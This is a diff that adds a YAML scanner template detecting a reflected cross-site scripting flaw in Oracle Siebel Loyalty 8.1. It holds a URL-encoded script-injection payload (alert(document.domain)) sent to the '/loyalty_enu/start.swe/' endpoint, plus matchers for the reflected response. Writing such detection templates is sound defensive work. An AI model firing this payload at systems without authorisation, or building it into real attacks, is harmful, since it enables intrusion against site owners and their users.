@@ -1,0 +1,32 @@
+id: oracle-siebel-xss
+brief:
+    title: Oracle Siebel Loyalty 8.1 - Cross-Site Scripting
+    by: dhiyaneshDK
+    level: high
+    about: A vulnerability in Oracle Siebel Loyalty allows remote unauthenticated attackers to inject arbitrary Javascript code into the responses returned by the '/loyalty_enu/start.swe/' endpoint.
+    label:
+        - xss
+        - oracle
+        - siebel
+        - packetstorm
+        - edb
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      signs:
+        - "on": word
+          has:
+            - </script><script>alert(document.domain)</script>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
